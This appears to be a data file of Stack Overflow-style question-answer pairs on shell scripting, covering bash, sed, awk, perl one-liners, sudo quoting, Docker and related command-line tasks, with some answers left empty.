    "How to configure 'less' to show formatted markdown files?": "Take a look at Pandoc. It can convert files from markdown format to groff man pages which you can then view in man.\nYour .lessfilter script would be:\ncase \"$1\" in\n  *.md)\n    pandoc -s -f markdown -t man \"$1\" | man -l -\n    ;;\nAlternatively, convert it to html using the markdown command and then use the lynx browser to view it, but this didn't work too well for me.\ncase \"$1\" in\n  *.md)\n    markdown \"$1\" | lynx -stdin\n    ;;\nAnd, yes, the lessfilter script must write to stdout.",
    "Can a shell script indicate that its lines be loaded into memory initially?": "The best answer I've found is a very slight variation on the solutions offered to How to make shell scripts robust to source being changed as they run. Thanks to camh for noting the repost!\n#!/bin/sh\n{\n    # Your stuff goes here\n    exit\n}\nThis ensures that all of your code is parsed initially; note that the 'exit' is critical to ensuring that the file isn't accessed later to see if there are additional lines to interpret. Also, as noted on the previous post, this isn't a guarantee that other scripts called by your script will be safe.\nThanks everyone for the help!",
    "Override a builtin command with an alias": "I also tried cd(){ echo before; cd $1; echo after;  } however it repetedly echos \"before\".\nbecause it calls recursively the cd defined by you. To fix, use the builtin keyword like:\ncd(){ pwd; builtin cd \"$@\"; pwd; }\nPs: anyway, IMHO isn't the best idea redefining the shell builtins.",
    "Heroku: \"bash: ./start.sh: Permission denied\"": "For that to work, start.sh must be executable:\nchmod a+x start.sh\nIf you cannot arrange for that to happen on the machine where the file runs, you can invoke it directly with bash; instead of ./start.sh, use bash ./start.sh (or even just bash start.sh)",
    "How can I do bash 'set -e', 'set -u' and 'set -x' in fish?": "For completeness:\nset -e: exits if a command fails\nset -u: errors if an variable is referenced before being set\nset -x: shows the commands that get run\nSorry, there's no equivalent of any of those options in fish! If you are interested in seeing them added, the issue tracking them is at https://github.com/fish-shell/fish-shell/issues/805\nAs you are surely discovering, fish is aimed more at interactive use than scripting. It's fine and common to use fish interactively, but write scripts using sh.",
    "Customize tab completion in shell": "You will likely find a file on your system called /etc/bash_completion which is full of functions and complete commands that set up this behavior. The file will be sourced by one of your shell startup files such as ~/.bashrc.\nThere may also be a directory called /etc/bash_completion.d which contains individual files with more completion functions. These files are sourced by /etc/bash_completion.\nThis is what the wine completion command looks like from the /etc/bash_completion on my system:\ncomplete -f -X '!*.@(exe|EXE|com|COM|scr|SCR|exe.so)' wine\nThis set of files is in large part maintained by the Bash Completion Project.",
    "What is the meaning of -n, -z, -x, -L, -d, etc... in Shell Script?": "IMHO best way is you could simply do man test for all these details. It is very well explained there. As follows is the text from man page. For BASH conditional expressions look for link https://www.gnu.org/software/bash/manual/html_node/Bash-Conditional-Expressions.html too once.\n   -b FILE\n          FILE exists and is block special\n\n   -c FILE\n          FILE exists and is character special\n\n   -d FILE\n          FILE exists and is a directory\n\n   -e FILE\n          FILE exists\n\n   -f FILE\n          FILE exists and is a regular file\n\n   -g FILE\n          FILE exists and is set-group-ID\n\n   -G FILE\n          FILE exists and is owned by the effective group ID\n\n   -h FILE\n          FILE exists and is a symbolic link (same as -L)\n\n   -k FILE\n          FILE exists and has its sticky bit set\n\n   -L FILE\n          FILE exists and is a symbolic link (same as -h)\n\n   -O FILE\n          FILE exists and is owned by the effective user ID\n\n   -p FILE\n          FILE exists and is a named pipe\n\n   -r FILE\n          FILE exists and read permission is granted\n\n   -s FILE\n          FILE exists and has a size greater than zero\n\n   -S FILE\n          FILE exists and is a socket\n\n   -t FD  file descriptor FD is opened on a terminal\n\n   -u FILE\n          FILE exists and its set-user-ID bit is set\n\n   -w FILE\n          FILE exists and write permission is granted\n\n   -x FILE\n          FILE exists and execute (or search) permission is granted\nFor expressions in man test it is given:\n   ( EXPRESSION )\n          EXPRESSION is true\n\n   ! EXPRESSION\n          EXPRESSION is false\n\n   EXPRESSION1 -a EXPRESSION2\n          both EXPRESSION1 and EXPRESSION2 are true\n\n   EXPRESSION1 -o EXPRESSION2\n          either EXPRESSION1 or EXPRESSION2 is true\n\n   -n STRING\n          the length of STRING is nonzero\n\n   STRING equivalent to -n STRING\n\n   -z STRING\n          the length of STRING is zero\n\n   STRING1 = STRING2\n          the strings are equal\n\n   STRING1 != STRING2\n          the strings are not equal\n\n   INTEGER1 -eq INTEGER2\n          INTEGER1 is equal to INTEGER2\n\n   INTEGER1 -ge INTEGER2\n          INTEGER1 is greater than or equal to INTEGER2\nFor conditional expressions info go for man bash it gives info as follows too.\nCONDITIONAL EXPRESSIONS Conditional expressions are used by the [[ compound command and the test and [ builtin commands to test file attributes and perform string and arithmetic comparisons. Expressions are formed from the following unary or binary primaries. If any file argument to one of the primaries is of the form /dev/fd/n, then file descriptor n is checked. If the file argument to one of the primaries is one of /dev/stdin, /dev/stdout, or /dev/stderr, file descriptor 0, 1, or 2, respectively, is checked.\n   Unless otherwise specified, primaries that operate on files follow symbolic links and operate on the target of the link, rather \nthan the link itself.\n   When used with [[, The < and > operators sort lexicographically using the current locale.",
    "\"free command not found\" while running bash script using git bash": "for debian /ubuntu . just run\napt-get install procps \nfor centos\nyum install procps\nthe procps include free , top etc linux base commond",
    "How can I use PowerShell's -filter parameter to exclude values/files?": "-Filter is not the right way. Use the -exclude parameter instead:\n$srcfiles = Get-ChildItem $srcPath -exclude *.htm*\n-exclude accepts a string[] type as an input. In that way you can exclude more than one extension/file type as follows:\n $srcfiles = Get-ChildItem $srcPath -exclude *.htm*,*.css,*.doc*,*.xls*\n..And so on.",
    "Using parameters within a shell command in Jenkinsfile for Jenkins pipeline": "",
    "Can someone explain me why awk's sub() / gsub() works like this?": "When you write\necho \"fffff\"|awk '{gsub('f', \"b\")}1'\nwhat awk sees is {gsub(f, \"b\")}1. It interprets f as a variable, with an empty value, and substitutes every empty string in the input with b.\nThe empty string is found between each character and after the last one, so awk inserts a b after each f.\nYou can substitute // or \"\" for the same effect, without an unused variable:\necho \"fffff\"|awk '{gsub(//, \"b\")}1'            # fbfbfbfbfb",
    "What is the meaning of !# (bang-pound) in a sh / Bash shell script?": "From the original documentation:\nScript files may have an optional header that is ignored if present. There are two ways to format the header: either beginning with #! and ending with !#, or beginning with ::#! and ending with ::!#.\nSo the following code is just a header for a Scala script:\n#!/usr/bin/env bash\nexec scala \"$0\" \"$@\"\n!#",
    "bash scripting: build a command then execute": "It looks like your command syntax is correct. To run the command from a script in bash and capture the result, use this syntax:\ncmd_string=\"ls\"\nresult=$($cmd_string)\necho $result",
    "Message \"syntax error near unexpected token `('\"": "NOTE: While this answer seems to have been correct at the time [sudo was changed later that same year to add extra escaping around characters in the arguments with -i and -s], it is not correct for modern versions of sudo, which escape all special characters when constructing the command line to be passed to $SHELL -c. Always be careful and make sure you know what passing a command to your particular version of sudo will do, and consider carefully whether the -s option is really needed for your command and/or, if it would, if you'd be better served with sudo sh -c.\nSince you've got both the shell that you're typing into and the shell that sudo -s runs, you need to quote or escape twice. Any of the following three would have worked with this now-ancient version of sudo:\nsudo -su db2inst1 '/opt/ibm/db2/V9.7/bin/db2 \"force application (1995)\"'\nsudo -su db2inst1 '/opt/ibm/db2/V9.7/bin/db2 force\\ application\\ \\(1995\\)'\nsudo -su db2inst1 /opt/ibm/db2/V9.7/bin/db2 force\\\\ application\\\\ \\\\\\(1995\\\\\\)\nOut of curiosity, why do you need -s? Can't you just do the following?\nsudo -u db2inst1 /opt/ibm/db2/V9.7/bin/db2 'force application (1995)'\nsudo -u db2inst1 /opt/ibm/db2/V9.7/bin/db2 force\\ application\\ \\(1995\\)",
    "How to run a command recursively on all files except for those under .svn directories": "Actual tested solution:\n$ find . -type f \\! -path \\*/\\.svn/\\* -exec dos2unix {} \\;",
    "In detail, what happens when you press Ctrl-C in a terminal?": "tl;dr the kernel does it.\nEach pty (pseudo tty) has two ends, a master and a slave. In the xterm example, xterm would be holding onto the master file descriptor. Any key presses are written directly into the master fd. The slave fd (pts, or pty slave) is owned by a session and passed to whatever the foreground process group is.\nWhenever an ASCII ETX character (^C) is written to the master, the kernel translates that into sending SIGINT to the foreground process group with the corresponding controlling terminal. This is actually a pty setting. You can run stty -a and see that the default is intr = ^C;, meaning ^C or ETX is the \"SIGINT\" character. This can be changed to a different character or disabled entirely.\nA more complex example would be how Ctrl-C works through an interactive SSH session. Interactive SSH sessions allocate a pty on the server side. The client side pty is set to raw mode, meaning that the client side kernel will not translate ETX into SIGINT. Instead, the client side kernel passes the ETX along to the slave. In this case, the ssh client process takes that ETX and passes it along to the server sshd process. If the server sshd pty is not in raw mode, then the server's kernel will translate that ETX into a SIGINT to its foreground process group. This is how Ctrl-C sends SIGINT to the process running on the server instead of killing your client side SSH and leaving you hanging.",
    "Running OpenSSH in an Alpine Docker Container": "A container is not a full installed environment. The official document is for that installed alpine on some machine. With power on, boot up services, etc. that a container does not have.\nSo, anything in /etc/init.d/ can not be used directly in a container which is used by boot up service (like systemd, or alpine's rc*). That's why you got error messages cause the rc* isn't installed in the container.\nWhat you need to do is start sshd manuanlly. You can take look on below example:\nhttps://hub.docker.com/r/danielguerra/alpine-sshd/~/dockerfile/",
    "could not connect to tcp:5037: cannot connect to 127.0.0.1:5037: No connection could be made because the target machine actively refused it. (10061)": "",
    "bash loop skip commented lines": "while read line; do\n  case \"$line\" in \\#*) continue ;; esac\n  ...\ndone < /tmp/my/input\nFrankly, however, it is often clearer to turn to grep:\ngrep -v '^#' < /tmp/myfile | { while read line; ...; done; }",
    "Using set -e / set +e in bash with functions": "Shell functions don't really have \"return values\", just exit codes.\nYou could add && : to the caller, this makes the command \"tested\", and won't exit it:\nfoo() {\n    echo 'x'\n    return 42\n}\n\nout=$(foo && :)\necho $out\nThe : is the \"null command\" (ie. it doesn't do anything). In this case it doesn't even get executed, since it only gets run if foo return 0 (which it doesn't).\nThis outputs:\nx\nIt's arguably a bit ugly, but then again, all of shell scripting is arguably a bit ugly ;-)\nQuoting sh(1) from FreeBSD, which explains this better than bash's man page:\n -e errexit\n         Exit immediately if any untested command fails in non-interactive\n         mode.  The exit status of a command is considered to be explicitly\n         tested if the command is part of the list used to control an if,\n         elif, while, or until; if the command is the left hand operand of\n         an \u201c&&\u201d or \u201c||\u201d operator; or if the command is a pipeline preceded\n         by the ! operator.  If a shell function is executed and its exit\n         status is explicitly tested, all commands of the function are con\u2010\n         sidered to be tested as well.",
    "How to send input to a program through stdin in Rust": "This program demonstrates how you can launch external programs and stream their stdout -> stdin together:\nuse std::io::{BufRead, BufReader, BufWriter, Write};\nuse std::process::{Command, Stdio};\n\nfn main() {\n    // Create some argument vectors for lanuching external programs\n    let a = vec![\"view\", \"-h\", \"file.bam\"];\n    let outsam = vec![\"view\", \"-bh\", \"-o\", \"rust.bam\", \"-\"];\n\n    let mut child = Command::new(\"samtools\")\n        .args(&a)\n        .stdout(Stdio::piped())\n        .spawn()\n        .unwrap();\n    let outchild = Command::new(\"samtools\")\n        .args(&outsam)\n        .stdin(Stdio::piped())\n        .spawn()\n        .unwrap();\n\n    // Create a handle and writer for the stdin of the second process\n    let mut outstdin = outchild.stdin.unwrap();\n    let mut writer = BufWriter::new(&mut outstdin);\n\n    // Loop over the output from the first process\n    if let Some(ref mut stdout) = child.stdout {\n        for line in BufReader::new(stdout).lines() {\n\n            let mut l: String = line.unwrap();\n            // Need to add an end of line character back to the string\n            let eol: &str = \"\\n\";\n            l = l + eol;\n\n            // Print some select lines from the first child to stdin of second\n            if (l.chars().skip(0).next().unwrap()) == '@' {\n                // convert the string into bytes and write to second process\n                let bytestring = l.as_bytes();\n                writer.write_all(bytestring).unwrap();\n            }\n        }\n    }\n}",
    "Getting Emacs ansi-term and Zsh to play nicely": "Try MultiTerm.\nIts the only Emacs terminal mode that seems to play nice with zsh. It allows you to easily set which commands you want captured by emacs and which you want routed to the terminal. The default settings have been good enough for me so far though.\nAlso, add the following to your .zshrc to allow emacs to track your current directory as you cd around.\nif [ -n \"$INSIDE_EMACS\" ]; then\n  chpwd() { print -P \"\\033AnSiTc %d\" }\n  print -P \"\\033AnSiTu %n\"\n  print -P \"\\033AnSiTc %d\"\nfi",
    "SSH heredoc: bash prompt": "If you don't need any variables from the client, why not try - and ssh -t might be useful.\nexport CLIENT=me \n\nCMDS=$(cat <<CMD \ncd downloads/ \nread -e -p \"Enter the path to the file: \" FILEPATH \necho \\$FILEPATH \neval FILEPATH=\"\\$FILEPATH\" \n\necho \"Downloading \\$FILEPATH to $CLIENT\" \nCMD \n) \n\nssh localhost -t \"$CMDS\" \nNote that if your only issue with double-quotes is escaping, and you do not plan on using ' single quotes in your script, then you can ust do this:\nssh -t $SERVER '\n# your script, unescaped.\n# if you want access to a locally defined variable,\necho \"CLIENT is '$CLIENT'.\"\n'",
    "sed command creates randomly named files": "-i is the suffix given to the new/output file. Also, you need -e for the command.\nHere's how you use it:\nsed -i '2' -e 's/string1/string2/g' test.txt\nThis will create a file called test.txt2 that is the backup of test.txt\nTo replace the file (instead of creating a new copy - called an \"in-place\" substitution), change the -i value to '' (ie blank):\nsed -i '' -e 's/string1/string2/g' test.txt\nEDIT II\nHere's actual command line output from a Mac (Snow Leopard) that show that my modified answer (removed space from between the -i and the suffix) is correct.\nNOTE: On a linux server, there must be no space between it -i and the suffix.\n> echo \"this is a test\" > test.txt\n> cat test.txt\nthis is a test\n> sed -i '2' -e 's/a/a good/' test.txt \n> ls test*\ntest.txt    test.txt2\n> cat test.txt\nthis is a good test\n> cat test.txt2\nthis is a test\n> sed -i '' -e 's/a/a really/' test.txt \n> ls test*\ntest.txt    test.txt2\n> cat test.txt\nthis is a really good test",
    "Force a shell script to fflush": "If comands use stdio and are connected to a terminal they'll be flushed per line. Otherwise you'll need to use something like stdbuf on commands in a pipe line http://www.pixelbeat.org/programming/stdio_buffering/\ntl;dr: instead of printf ... try to put to the script stdbuf -o0 printf .., or stdbuf -oL printf ...",
    "What's the difference between the `USER` and `USERNAME` environment variables?": "On windows: ENV['username'] will output the current username.\nOn linux: If the script is run through sudo, \"USER\" will be the sudo-ed-to user (usually root) and \"USERNAME\" will be the user who ran sudo.\nOn Mac : only USER exists (on MacOS 10.15. To be confirmed on previous versions)\nHere's a list of XP Environment variables: http://vlaurie.com/computers2/Articles/environment.htm\nAnd here's a list of Vista/7 Environment variables, you'll notice they are slightly different: http://vlaurie.com/computers2/Articles/environment-variables-windows-vista-7.htm\nEdit: The safest approach would be to write a small function that determines what system you are on (I gather from your comment above you're wanting a Write-Once, Run-Anywhere app) and sets the appropriate values based upon that.",
    "Making Unix shell scripts POSIX compliant": "POSIX\nOne first step, which gives you indications of what works or not and why, is to set the shebang to /bin/sh and use the ShellCheck site to analyze your script.\nFor example, paste this script in the ShellCheck editor window:\n#!/bin/sh\nread -r a b <<<\"$1\"\necho $((a+b))\nto get an indication that: \"In POSIX sh, here-strings are undefined\".\nAs a second step, you can use a shell that is as compatible with POSIX as possible.\nOne shell that is compatible with most other simple shells, is dash, Debian default system shell, which is a derivative of the older BSD ash.\nAnother shell compatible with POSIX is posh.\nHowever, dash and/or posh may not be available for some systems.\nThere is lksh (with a ksh flavor), with the goal to be compatible with legacy (old) shell scripts. From its manual:\nlksh is a command interpreter intended exclusively for running legacy shell scripts.\nBut there is the need to use options when calling lksh, like -o posix and -o sh:\nNote that it's strongly recommended to invoke lksh with at least the -o posix option, if not both that and -o sh, to fully enjoy better compatibility to the POSIX standard (which is probably why you use lksh over mksh in the first place) or legacy scripts, respectively.\nYou would call lksh -o posix -o sh instead of the simple lksh.\nUsing options is a way to make other shells become POSIX compatible. Like lksh, using the option -o posix, like bash -o posix.\nIn bash, it is even possible to turn the POSIX option on inside a script, with:\nshopt -o posix            # also with: set -o posix\nIt is also possible to make a local link to bash or zsh that makes both act like an old sh shell. Like this:\n$ ln -s /bin/bash ./sh\n$ ./sh\nThere are plenty of alternatives (dash, posh, lksh, bash, zsh, etc.) to get a shell that will work as a POSIX shell.\nPortable\nHowever, even so, all the above does not ensure \"portability\".\nUnfortunately, making a shell script 'POSIX-compliant' is usually easier than making it run on any real-world shell.\nThe only real-world sensible recommendation is test your script in several shells.\nLike the list above: dash, posh, lksh, and bash --posix.\nSolaris is a world on its own, probably you will need to test against /bin/sh and xpg4/sh.\nFollowup:\nHow can I test for POSIX compliance for shell scripts?",
    "Configure nix-shell to use a shell other than Bash?": "Open a shell using:\nnix-shell . --command \"zsh\"\nThanks to the guys on the #nixos IRC channel for getting me a quick answer.",
    "XSLT 2.0 transformation via linux shell": "The documentation of Saxon is online: http://www.saxonica.com/documentation/#!using-xsl/commandline. So you need:\njava -jar saxon9he.jar -xsl:foo.xsl -s:foo.xml -o:bar.xml",
    "Switch user without creating an intermediate process": "The difference between sudo sleep and exec sudo sleep is that in the second command sudo process replaces bash image and calling shell process exits when sleep exits\npstree -p $$\nbash(8765)\u2500\u2500\u2500pstree(8943)\n\n((sleep 1; pstree -p $$ )&); sudo -u user sleep 2\nbash(8765)\u2500\u2500\u2500sudo(8897)\u2500\u2500\u2500sleep(8899)\n\n((sleep 1; pstree -p $$ )&); exec sudo -u user sleep 2\nsudo(8765)\u2500\u2500\u2500sleep(8993)\nhowever the fact that sudo or su fork a new process depends on design and their implementation (some sources found here).\nFrom sudo man page :\nProcess model\nWhen sudo runs a command, it calls fork(2), sets up the execution environment as described above, and calls the execve system call in the child process. The main sudo process waits until the command has completed, then passes the command's exit status to the security policy's close function and exits. If an I/O logging plugin is config- ured or if the security policy explicitly requests it, a new pseudo-terminal (\u201cpty\u201d) is created and a second sudo process is used to relay job control signals between the user's existing pty and the new pty the command is being run in. This extra process makes it possible to, for example, suspend and resume the command. Without it, the com- mand would be in what POSIX terms an \u201corphaned process group\u201d and it would not receive any job control signals. As a special case, if the policy plugin does not define a close function and no pty is required, sudo will execute the command directly instead of calling fork(2) first. The sudoers policy plugin will only define a close function when I/O logging is enabled, a pty is required, or the pam_session or pam_setcred options are enabled. Note that pam_session and pam_setcred are enabled by default on sys- tems using PAM.",
    "Running android unit tests from the command line?": "",
    "Equivalent to Unix eval in Windows": "If it's in cmd.exe, using a temporary file is the only option [that I know of]:\npython -c \"print(\\\"Hi\\\")\" > temp.cmd\ncall temp.cmd\ndel temp.cmd",
    "What pattern does .gitignore follow?": "gitignore use of '*' follows the glob convention:\nGit treats the pattern as a shell glob suitable for consumption by fnmatch(3) with the FNM_PATHNAME flag: wildcards in the pattern will not match a / in the pathname.\nFor example, \"Documentation/*.html\" matches \"Documentation/git.html\" but not \"Documentation/ppc/ppc.html\" or \"tools/perf/Documentation/perf.html\".\nThe OP Lone Learner asks in the comments:\nDoes the shell also use fnmatch(3) to process glob patterns?\nIn that case why does * not match zero characters before. (i.e. hidden files) but gitignore does?\nBecause that is a shell configuration choice.\nType (using shopt, which is specific to bash):\nshopt -s dotglob\necho *.foo\n.foo foo.foo\nThat is using dotglob\nIf set, Bash includes filenames beginning with a '.' in the results of filename expansion. (for pattern matching)",
    "How do I run \"adb shell\" commands in a terminal emulator locally on an Android device?": "",
    "Generate android apk using shell script from php?": "",
    "Remove all files older than X days, but keep at least the Y youngest [duplicate]": "Use find to get all files that are old enough to delete, filter out the $KEEP youngest with tail, then pass the rest to xargs.\nfind ${DB_DUMP_DIR} -type f -printf '%T@ %p\\n' -mmin +$RETENTION |\n  sort -nr | tail -n +$KEEP |\n  xargs -r echo\nReplace echo with rm if the reported list of files is the list you want to remove.\n(I assume none of the dump files have newlines in their names.)",
    "tr [:upper:] [:lower:] with Cyrillic text": "This is what I found at Wikipedia (without any reference, though):\nMost versions of tr, including GNU tr and classic Unix tr, operate on single-byte characters and are not Unicode compliant. An exception is the Heirloom Toolchest implementation, which provides basic Unicode support.\nAlso, this is old but related.\nAs I mentioned in the comment, sed seems to work (GNU sed, at least):\n$ echo '\u0421\u0422\u042d\u041a' | sed 's/[[:upper:]]*/\\L&/'\n\u0441\u0442\u044d\u043a",
    "Writing data to file in Dockerfile": "When you RUN chmod 755 script.sh && ./script.sh it actually execute this script inside the docker container (ie: in the docker layer).\nWhen you ADD file.txt . you are trying to add a file from your local filesystem inside the docker container (ie: in a new docker layer).\nYou can't do that because the file.txt doesn't exist on your computer.\nIn fact, you already have this file inside docker, try docker run --rm -ti mydockerimage cat file.txt and you should see it's content displayed",
    "Execute xp_cmdshell command as specific user": "Because you're connecting to SQL as a login in the sysadmin group, xp_cmdshell runs as the service account.\nIf you connect as a low-privilege login, then it will use the xp_cmdshell_proxy_account instead. So try doing EXECUTE AS LOGIN='lowprivaccount' first, to see if that helps.\nOf course, what you're actually asking is not the expected use. Expected use is that the high-privilege accounts can allow xp_cmdshell to use the Service Account, whereas everyone else has to put up with the lower privilege proxy account.",
    "How to check if the sed command replaced some string? [duplicate]": "sed\nis not the right tool if you need to count the substitution,\nawk\nwill fit better your needs :\nawk -v OLD=foo -v NEW=bar '\n    ($0 ~ OLD) {gsub(OLD, NEW); count++}1\n    END{print count \" substitutions occured.\"}\n' \"$source_filename\"\nThis latest solution counts only the number of lines substituted. The next snippet counts all substitutions with\nperl\n. This one has the advantage to be clearer than awk and we keep the syntax of sed substitution :\nOLD=foo NEW=bar perl -pe '\n    $count += s/$ENV{OLD}/$ENV{NEW}/g;\n    END{print \"$count substitutions occured.\\n\"}\n' \"$source_filename\"\nEdit\nThanks to william who had found the $count += s///g trick to count the number of substitutions (even or not on the same line)",
    "Getting \"Error occurred during initialization of VM\"": "Thanks to Andrew for the hint.\nAs said in the post it was a legacy script, and had thousands of line in each of the script which made our analysis hard. But finally figured out that the process in which we were getting error was being launched by another user. That user didn't had permission to access the parent folder and hence we were getting\nCould not determine current working directory.\nI gave the permission on the parent folder to that user and it worked. Thanks to all of you...",
    "How to return to bash prompt after printing output from backgrounded function?": "What is the problem you're trying to solve?\nRight now, this is more or less a cosmetic problem. You're still in the shell, and the prompt is still there. Just type another command and it will be executed.\nAlternatively, run the function in the foreground, or if you need to do something else in between, use wait:\n$ fn & pid=$!\n$ : something else\n$ wait ${pid}",
    "Stopping Android studio shell process wont stop tests": "That can be fixed by following these steps:\nOpen 'Run' tab in Android Studio\nTap 'X' next to test which has just passed",
    "postgresql - start on mac - `pg_ctl` not working": "OS X ships with the command line client (for interacting with postgres databases) not the server.\nYou need to install the server.\nCheck the postgres site or grab the postgres.app",
    "How to run a shell script using Spotlight passing a parameter?": "No, it does not seem to be possible currently.",
    "How to open an app in terminal and passing the current working directory?": "The command you might be looking for is\npwd",
    "What is your latest useful Perl one-liner (or a pipe involving Perl)? [closed]": "Please see my slides for \"A Field Guide To The Perl Command Line Options.\"",
    "Does it make sense to rewrite Perl and shell scripts in java?": "The trouble is, your Gut reaction might be right, but that doesn't mean your manager is necessarily wrong - he probably has very good reasons for wanting it all done in java. Not least, if you fall under a bus, finding a replacement who knows java, perl and bash is going to be a lot harder than finding someone who knows java. And that's leaving aside the \"they can only be run on a PC with cygwin installed\" issue. And in all likelihood, performance isn't as big an issue as you think it is.\nHaving said that, your best bet is to spend a bit of time estimating the time it will take to port them all to java, so he can make an informed decision. And while you're at it, estimate how long it would take to port the bash scripts to perl and document them. Then let him decide. Remember - he doesn't get to spend the majority of his time coding, like you do, so it's only fair that he gets to make some decisions instead.\nIf he decides to proceed with the java option, port one of the scripts as well as you can, then report back with the two versions and, if you're right about the concision of the perl/bash scripts, you should be able to get some mileage from examining the two versions side by side.\nEDIT: MCS, to be honest, it sounds to me as if those scripts are better implemented in perl and/or bash, rather than java, but that's not really the point - the point is how do you demonstrate that to your manager. If you address that, you address both the \"gut reaction\" question (btw, here's a tip - start referring to your gut reactions as \"judgement, based on experience\") and the \"best way to present my case\" question.\nNow, the first thing you have to realise is that your manager is (probably) not going down this path just to piss you off. He almost certainly has genuine concerns about these scripts. Given that they're probably genuine concerns (and there's no point in going any further if they're not - if he's made his mind up to do this thing for some political reason then you're not going to change his mind, no matter what, so just get on with it and add it to your CV) it follows that you need to provide him with information that addresses his concerns if you're going to get anywhere. If you can do that then you're more than halfway to getting your own way.\nSo, what are his concerns? Based on your post, and on my judgement and experience :-) I'd say they are:\nmaintainability\nthat's it, just maintainability\nI would also guess that his concerns are not:\nperformance\nI might be wrong about this last one, of course; in the last place I worked we had a SQL Server performance problem to do with replication that impacted the business's ability to provide customer support, so performance was an issue, so we addressed it. But generally speaking performance isn't as much of an issue as programmers think. If he's actually told you that performance is an issue, then factor it in. But if he hasn't mentioned it, forget it - it's probably only you that thinks the fact that these scripts run faster in perl/bash than they probably will in java matters at all.\nSo, maintainability. This comes down to answering the question \"who will maintain these scripts if MCS falls under a bus?\" and the supplementary question \"will that cause me (i.e. your manager) problems?\" (Aside: don't get hung up on the whole bus thing. \"Falling under a bus\" is a useful and diplomatic shorthand for all sorts of risks, e.g. \"what happens if someone lures him away with a salary my company can't match?\", \"what happens if he decides to emigrate to Bermuda?\", \"what happens if I want to fire him?\", \"what happens if I want to promote him?\", and, of course, \"what happens if just he stops turning up for work one day for some unknown, possibly bus-related, reason?\")\nRemember, it's your manager's job to consider and mitigate these risks.\nSo, how to do that?\nFirst, demonstrate how maintainable these scripts actually are. Or at least how maintainable they can be. Document them (in proper documents, not in the code). Train a colleague to maintain them (pick someone who would like to acquire/improve their perl and bash skills, and who your manager trusts). Refactor them to make them more readable (sacrificing performance and clever scripting tricks if necessary). If you want to continue using bash, create a document that provides step-by-step instructions for installing cygwin and bash. Regardless, document the process of installing perl, and running the scripts.\nSecond, pick one of the scripts and port it to java. Feel free to pick the script that best demonstrates the advantages of perl/bash over java, but do the best job you can of porting it. Use java.util.regex to do the same clever things you do in your perl. Document it to the standard that other in-house java utilities are documented. If performance is actually a factor, measure its performance relative to the perl/bash script.\nThird, having been through that exercise, be honest with yourself about their relative maintainability. Ask the guy you trained what he thinks. If you still think the perl/bash scripts are more or less as maintainable as java versions would be, estimate the work involved in porting the remaining scripts to java as accurately as you can (you'll be able to do this pretty accurately now, because you'll have actually ported one). Then take the comparative scripts and the documentation and the estimates (and the performance figures, if appropriate) to your manager and go through them with him. Present your counter-proposals (a. leave them in perl and bash but document them and train a colleague, and b. port the bash scripts to perl, document them and train a colleague).\nFinally, let your manager weigh up all the information and decide, and abide by his decision. In fact, don't just abide by his decision, accept the fact that he might be right. Just because you know more about perl/bash/java than him doesn't mean you necessarily know more about managing the team/department than he does. And if his decision is to stick with perl/bash, or port to perl, rejoice! Because you have not only got your own way, you have gone up in your manager's estimation and learned an invaluable lesson along the way.",
    "using bash to get revision number from subversion": "Use svnversion. This will output the revision number/range with minimal additional cruft",
    "Bash last index of": "The bash man page section titled \"Variable Substitution\" describes using ${var#pattern}, ${var##pattern}, ${var%pattern}, and ${var%%pattern}.\nAssuming that you have a variable called filename, e.g.,\nfilename=\"artifact-1.2.3.zip\"\nthen, the following are pattern-based extractions:\n% echo \"${filename%-*}\"\nartifact\n\n% echo \"${filename##*-}\"\n1.2.3.zip\nWhy did I use ## instead of #?\nIf the filename could possibly contain dashes within, such as:\nfilename=\"multiple-part-name-1.2.3.zip\"\nthen compare the two following substitutions:\n% echo \"${filename#*-}\"\npart-name-1.2.3.zip\n\n% echo \"${filename##*-}\"\n1.2.3.zip\nOnce having extracted the version and extension, to isolate the version, use:\n% verext=\"${filename##*-}\"\n% ver=\"${verext%.*}\"\n% ext=\"${verext##*.}\"\n% echo $ver\n1.2.3\n% echo $ext\nzip",
    "How can I use a variable in curl call within bash script [duplicate]": "Variables are not expanded within single-quotes. Rewrite using double-quotes:\ncurl -X POST -H 'Content-type: application/json' --data \"{\\\"text\\\": \\\"${message}\\\"}\"\nJust remember that double-quotes within double-quotes have to be escaped.\nAnother variation could be:\ncurl -X POST -H 'Content-type: application/json' --data '{\"text\": \"'\"${message}\"'\"}'\nThis one breaks out of the single quotes, encloses ${message} within double-quotes to prevent word splitting, and then finishes with another single-quoted string. That is:\n... '{\"text\": \"'\"${message}\"'\"}'\n    ^^^^^^^^^^^^\n    single-quoted string\n\n\n... '{\"text\": \"'\"${message}\"'\"}'\n                ^^^^^^^^^^^^\n                double-quoted string\n\n\n... '{\"text\": \"'\"${message}\"'\"}'\n                            ^^^^\n                            single-quoted string\nHowever, as the other answer and @Charles Duffy pointed out in a comment, this is not a robust solution, because literal \" and other characters in $message may break the JSON.\nUse the other solution, which passes the content of $message to jq in a safe way, and jq takes care of correct escaping.",
    "How to execute certain commands if a file does NOT exist?": "Checking if a file exists is a very common task. To search for relevant questions, use the search bar (top right). I got lots of results with the terms \"bash script file exists\"\nIn any case, you want either the test builtin or its semantic equivalent [ ]:\n[ ! -e your_file ] && >your_file\nor\ntest ! -e your_file && >your_file\nwhich will first test that your_file does not (!) exist (-e) and creates it if that's the case.\nFor more information on the different tests you can run (other than -e), you can type:\nhelp -m test | less",
    "Perl: Find and replace specific string in multiple text file": "If you are on Unix like platform, you can do it using Perl on the command line; no need to write a script.\nperl -i -p -e 's/old/new/g;' *.config\nTO be on the safer side, you may want to use the command with the backup option.\nperl -i.bak  -p -e 's/old/new/g;' *.config",
    "How can I write a tiny Bash shell script to repeat an action every 5 seconds?": "The watch command is a good option. If you end up needing more control you can use a while loop:\nwhile [ 1 ]\ndo\n  cp source dest\n  sleep 5s\ndone",
    "Does CUT support multiple spaces as the delimiter?": "As others have stated, cut can't do it alone (and awk is the best choice, because it's the only tool required). If you still want to use cut, you can combine it with tr, however:\ntr -s ' ' <<<\"word1 word2   word3  word4\" | cut -d ' ' -f1,2,4\ntr -s ' ' folds each span of multiple spaces into one space each.",
    "Running a command as a background process/service": "UNIX systems can handle as many processes as you need simultaneously (just open new shell windows if you're in a GUI), so running a process in the background is only necessary if you need to carry on using the current shell window for other things once you've run an application or process that keeps running.\nTo run a command called command in background mode, you'd use:\ncommand &\nThis is a special character that returns you to the command prompt once the process is started. There are other special characters that do other things, more info is available here.",
